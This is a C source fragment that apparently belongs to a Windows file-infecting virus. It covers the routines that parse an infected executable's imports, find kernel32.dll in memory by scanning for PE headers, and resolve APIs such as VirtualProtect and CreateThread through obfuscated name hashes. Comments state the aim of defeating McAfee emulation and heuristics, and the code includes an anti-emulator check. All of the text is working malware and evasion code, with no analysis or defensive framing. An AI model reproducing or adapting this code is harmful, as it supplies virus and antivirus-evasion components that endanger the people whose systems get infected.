
///////////////////////////////////////////////////////////////
// Is string 'KERNEL32' - case insensitive ////////////////////

#ifdef _MSC_VER
	#pragma optimize("", off)
#else
	#pragma optimize(off)
#endif

BOOL IsStrKERNEL32(char *s)
{
	if ((s[0]!='K') && (s[0]!='k'))
		return FALSE;
	if ((s[1]!='E') && (s[1]!='e'))
		return FALSE;
	if ((s[2]!='R') && (s[2]!='r')) 
		return FALSE;
	if ((s[5]!='L') && (s[5]!='l'))
		return FALSE;
	if (s[6]!='3') 
		return FALSE;
	
	return TRUE;
}

///////////////////////////////////////////////////////////////
// Check API Function address /////////////////////////////////
DWORD GetFuncAddr(DWORD k,DWORD q,EXPORT_DIRECTORY_TABLE *edt)
{
	wMEMORY *wmem;
	dMEMORY *dmem; 
	DWORD ord;
	DWORD fncaddr=0;
	_KERNEL32 = (HANDLE)k; 

	wmem = (LPVOID)(k + q*2 + edt->OrdinalTableRVA);

	// ordinal (index in AddressTable)
	ord=wmem->word0; 

	dmem = (LPVOID)(k + ord*4 + edt->AddressTableRVA);
	fncaddr = k + dmem->dword0;

	return fncaddr;
}

///////////////////////////////////////////////////////////////
// Check Func /////////////////////////////////////////////////
void CheckFunc(unsigned char *fncname,DWORD k,DWORD q,EXPORT_DIRECTORY_TABLE *edt)
{
	DWORD lf=strlen(fncname);
	DWORD summ=0;
	DWORD humm=0;
	DWORD w, hash;

	for (w = 0; w < lf; w++) 
	{
		summ+=fncname[w];
		humm+=fncname[w/2]; 
	}

	if (lf > 41) 
		return;
	hash = lf*100000000 + summ*10000 + humm;

	if (hash==1414801486)
		_VirtualProtect = (DWORD*)GetFuncAddr(k,q,edt);
	if (hash==1212041152)
	{ 
		_GetTickCount = (DWORD*)GetFuncAddr(k,q,edt); 
		GetTicks1(); 
		EMUL=AntiEmulator(2); 
	}
	if (hash==2020292000) 
		_LeaveCriticalSection = (DWORD*)GetFuncAddr(k,q,edt);
	if (hash==2020462034)
		_EnterCriticalSection = (DWORD*)GetFuncAddr(k,q,edt);
	if (hash==2525782551)
		_InitializeCriticalSection = (DWORD*)GetFuncAddr(k,q,edt); 
	if (hash==1414021384)
		_GetProcAddress = (DWORD*)GetFuncAddr(k,q,edt);            
	if (hash==1211961192)
		_CreateThread = (DWORD*)GetFuncAddr(k,q,edt);              
	// if (hash==505050483)  _Sleep = (DWORD*)GetFuncAddr(k,q,edt);
}


///////////////////////////////////////////////////////////////
// Check Kernel

void CheckKernel(DWORD k0)
{
	// Get kernel32.dll MZ header
	dMEMORY *dmem;
	wMEMORY *wmem;
	PE_HEADER *pe;
	DWORD keRVA;
	unsigned char *dlln;
	EXPORT_DIRECTORY_TABLE *edt;
	DWORD q;
	// kernel32.dll addr part1
	DWORD k = k0 >> 16; 

	// kernel32.dll addr part2. we have to split it due to lcc compiler bug:
	k = k << 16;
	// DWORD k=(k0>>(5+LNMB1+LNMB0))<<(5+LNMB1+LNMB0);

	// Find PE header
	// step can be only 2^x, where x from 0 to 16 (1-65536)
	// to kill McAfee heuristic we use this
	k = FindPEheader(k, k0, 0x10000, &pe);	//changed : 0x1000

	// Get export table RVA
	// kernel32.dll export RVA
	keRVA = pe->exportrva;

	// export directory table
	edt=(LPVOID)(k+keRVA);

	// dll name
	dlln=(LPVOID)(k+edt->NameRVA); 

	//===== THIS IS THE END OF McAfee EMULATION ZONE
	//===== zaglushka vmesto realnoi kernel32 v mem i poetomu IsStrKERNEL32 sdelaet return 
	if (IsStrKERNEL32(dlln)==FALSE) 
		return; // Kernel32.dll check

	// List export functions
	for (q = 0; q < edt->NumOfNamePointers; q++)
	{
		DWORD fnadr;
		
		dmem = (LPVOID)(k+q*4+edt->NamePointersRVA);
		fnadr= k+dmem->dword0; // func name addr

		CheckFunc((LPVOID)fnadr,k,q,edt);
	}

	// EMUL==1 if not emulated, could be set to in CheckFunc
	EMUL = 1; // changed : EMUL n'etait jamais egale a 1
	_KERNEL32 = (HANDLE)((DWORD)_KERNEL32 * EMUL); 
}


///////////////////////////////////////////////////////////////
// Process infected file Imports from Specified dll

void ProcessDLLimports(DWORD a,IMPORT_DIRECTORY_TABLE_ENTRY *idte)
{
	//dll name
	char *dlln=(LPVOID)(a+idte->NameRVA);
  
	EMUL = 0;

   // Kernel32.dll check
	if (IsStrKERNEL32(dlln)==TRUE) 
	{
   
		DWORD q=0;
		dMEMORY *dmem;
		// any address in kernel32.dll (addr of first imported func)
		DWORD k0;
		// address table addr
		DWORD atadr = a+idte->AddressTableRVA;  

		// list all func. addresses from address table
		while (TRUE)
		{
   			dmem = (LPVOID)(atadr+q);
   			k0=dmem->dword0;
   			if (k0 == 0) 
				break;
   			CheckKernel(k0);
   			if (_KERNEL32 != NULL)
				return; 
   			q+=4;
		}
	}         
}


///////////////////////////////////////////////////////////////
// Find PEheader, step: 2^x, where x from 0 to 16 (1-0x10000)//
// NO GLOBAL VARS SHOULD BE USED HERE!

DWORD FindPEheader(DWORD a,DWORD a0,DWORD step,LPDWORD lp_peheader)
{
	// Find MZ header
	wMEMORY *wmem;
	dMEMORY *dmem; 
	PE_HEADER *pe;
	DWORD peadr;

 nxtblk:;
	wmem = (wMEMORY*)a;

	if (wmem->word0 != 0x5A4D)
		goto next; // 'MZ'==0x4D5A
	if (a != (a>>16)<<16) 
		goto next; // a should be also 64kb aligned!

	 // Check PE header
	dmem = (LPVOID)(a+0x3C);
	peadr = a + dmem->dword0;

	if (peadr > a0) 
		goto next; // not PE or corrupted

	pe = (LPVOID)peadr;

	if ((pe->id & 0x0000FFFF) != 0x4550) 
		goto next; // no 'PE' sig

	goto pe_found;

	// Not found, one more iteration

next:; 
	a-=step; 
	goto nxtblk; 

	// PE found
pe_found:;

	// Save peadr to dword, pointed by lpe
	*lp_peheader = peadr; 

	return a;
}

#ifdef _MSC_VER
	#pragma optimize("", on)
#else
	#pragma optimize(on)
#endif
